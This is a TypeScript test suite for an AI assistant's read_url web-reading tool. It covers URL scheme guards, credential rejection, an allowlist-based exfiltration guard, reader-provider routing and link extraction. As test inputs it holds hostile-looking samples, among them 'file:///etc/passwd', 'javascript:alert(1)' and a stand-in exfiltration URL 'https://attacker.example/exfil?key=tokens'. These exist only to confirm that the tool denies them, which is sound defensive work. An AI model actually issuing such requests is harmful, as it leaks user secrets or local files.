/** read_url talent parity (PocketPal ReadUrlEngine.ts): scheme + credential
 *  guards, the site-level exfiltration guard, provider readers vs the
 *  default reader, budgetPage, link extraction, exact denial copy. */

import {
  allowReadUrls,
  resetReadUrlAllowlist,
  seedReadUrlAllowlist,
} from "../allowlist.ts";
import { runTalent } from "../registry.ts";
import { resetSearchCache } from "../search-budget.ts";
import type { HttpFetch } from "../search.ts";

const AUTH = { provider: "brave", key: "bk", count: 5 };

function fakeFetch(
  impl: (url: string, init: RequestInit) => Promise<Response>,
): HttpFetch {
  return ((url: string, init: RequestInit) => impl(url, init)) as HttpFetch;
}

const read = (fetchImpl: HttpFetch, url: string) =>
  runTalent("read_url", JSON.stringify({ url }), { fetchImpl, search: AUTH });

beforeEach(() => {
  resetSearchCache();
  resetReadUrlAllowlist();
});

describe("argument + scheme guards", () => {
  it("fails a missing url argument", async () => {
    const out = await runTalent("read_url", "{}", { fetchImpl: fakeFetch(async () => new Response("")), search: AUTH });
    expect(out.ok).toBe(false);
    expect(out.content).toContain('missing or empty "url"');
  });

  it("fails non-http(s) URLs before any network", async () => {
    let calls = 0;
    const fetchImpl = fakeFetch(async () => {
      calls += 1;
      return new Response("x");
    });
    for (const bad of ["file:///etc/passwd", "javascript:alert(1)", "data:text/html,x"]) {
      const out = await read(fetchImpl, bad);
      expect(out.ok).toBe(false);
      expect(out.content).toEqual("read_url: only http(s) URLs are allowed");
    }
    expect(calls).toEqual(0);
  });

  it("rejects embedded credentials before any allowlist lookup", async () => {
    const fetchImpl = fakeFetch(async () => new Response("page"));
    allowReadUrls(["https://hit.example/page"]);
    // PocketParity order: isAllowedReadUrl fires FIRST, so an embedded
    // userinfo reads as the SCHEME guard's denial, not the exfil one.
    const out = await read(fetchImpl, "https://evil@hit.example/page");
    expect(out.ok).toBe(false);
    expect(out.content).toEqual("read_url: only http(s) URLs are allowed");
  });
});

describe("exfiltration guard (site-level, PocketParity matchReadUrl)", () => {
  it("allows any page on a host the USER named", async () => {
    seedReadUrlAllowlist(
      [{ role: "user", content: "can you check what's on en.wikipedia.org today?" }],
      [],
    );
    const fetchImpl = fakeFetch(async () =>
      new Response(`<html><body>article <a href="https://other.example/x">link</a></body></html>`),
    );
    // A page the model picked on the user's host, not an exact stored URL.
    const out = await read(fetchImpl, "https://en.wikipedia.org/wiki/Some_Page");
    expect(out.ok).toBe(true);
    expect(out.data?.url).toEqual("https://en.wikipedia.org/wiki/Some_Page");
  });

  it("denies hosts nobody named, with the reference copy", async () => {
    const fetchImpl = fakeFetch(async () => new Response("victim"));
    const out = await read(fetchImpl, "https://attacker.example/exfil?key=tokens");
    expect(out.ok).toBe(false);
    expect(out.content).toEqual(
      "read_url: this URL is not allowed. Use a page on a site the user named, or copy a URL exactly from a web_search result or a page you read with read_url; or run web_search first.",
    );
  });

  it("denies when only ASSISTANT text named the host", async () => {
    seedReadUrlAllowlist(
      [{ role: "assistant", content: "you should visit attacker.example for that" }],
      [],
    );
    const fetchImpl = fakeFetch(async () => new Response("x"));
    const out = await read(fetchImpl, "https://attacker.example");
    expect(out.ok).toBe(false);
  });
});

describe("fetch path", () => {
  it("routes a non-reader provider through r.jina.ai and budgets the text", async () => {
    allowReadUrls(["https://hit.example/page"]);
    let seen = "";
    // A reader returns PLAIN-TEXT-ish bodies — bare URL spans survive
    // budgetPage; HTML tags would be stripped away (PocketParity).
    const long = "word ".repeat(6000);
    // The bare URL sits BEFORE the long tail: budgetPage cuts at 4801
    // chars (1200 tokens ≈ 4800 + the ellipsis), so a trailing URL would
    // be dropped by the cut — a link beyond the budget is not advertised.
    const fetchImpl = fakeFetch(async (url) => {
      seen = String(url);
      return new Response(`see https://other.example/x inline\n${long}`);
    });
    const out = await read(fetchImpl, "https://hit.example/page");
    expect(seen.startsWith("https://r.jina.ai/https://hit.example/page")).toBe(true);
    expect(out.ok).toBe(true);
    // MODEL copy is fenced; the page budget is 1200 tokens ≈ 4800 chars.
    expect(out.content).toContain("BEGIN UNTRUSTED WEB CONTENT");
    // RENDERER copy: unfenced article + extracted links.
    expect(typeof (out.data as { text?: string }).text).toEqual("string");
    const dataText = (out.data as { text?: string }).text ?? "";
    expect(dataText.length).toBeLessThanOrEqual(1200 * 4 + 1);
    expect((out.data as { links?: unknown }).links).toEqual([
      "https://other.example/x",
    ]);
  });

  it("routes an exa provider through the native reader", async () => {
    allowReadUrls(["https://hit.example/page"]);
    let seen = "";
    const fetchImpl = fakeFetch(async (url, init) => {
      seen = String(url);
      expect(String(init.body)).toContain("https://hit.example/page");
      return new Response(JSON.stringify({ results: [{ title: "T", text: "from exa" }] }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    });
    const out = await runTalent("read_url", JSON.stringify({ url: "https://hit.example/page" }), {
      fetchImpl,
      search: { provider: "exa", key: "ek", count: 5 },
    });
    expect(seen).toEqual("https://api.exa.ai/contents");
    expect(out.ok).toBe(true);
    expect((out.data as { text?: string }).text).toEqual("from exa");
  });

  it("fails 'no readable content at' when the page text is blank", async () => {
    allowReadUrls(["https://hit.example/blank"]);
    const fetchImpl = fakeFetch(async () => new Response("   "));
    const out = await read(fetchImpl, "https://hit.example/blank");
    expect(out.ok).toBe(false);
    expect(out.content).toEqual("read_url: no readable content at https://hit.example/blank");
  });

  it("fails with setup copy when search is not configured", async () => {
    const fetchImpl = fakeFetch(async () => new Response("x"));
    const out = await runTalent("read_url", JSON.stringify({ url: "https://hit.example" }), {
      fetchImpl,
      search: null,
    });
    expect(out.ok).toBe(false);
    expect(out.content).toContain("Finish setup in Settings → Internet Search");
  });

  it("extracts up to 100 links and allows them for later reads", async () => {
    allowReadUrls(["https://hit.example/page"]);
    // Bare URL spans survive budgetPage's plain-text pass — markup links
    // would collapse to their labels and be unextractable.
    const links = Array.from(
      { length: 150 },
      (_, i) => `https://link${i}.example/${i}`,
    );
    const fetchImpl = fakeFetch(async () => new Response(links.join(" ")));
    const out = await read(fetchImpl, "https://hit.example/page");
    expect(out.ok).toBe(true);
    const carried = (out.data as { links?: string[] }).links ?? [];
    expect(carried.length).toEqual(100);
    expect(carried[99]).toEqual("https://link99.example/99");
  });
});
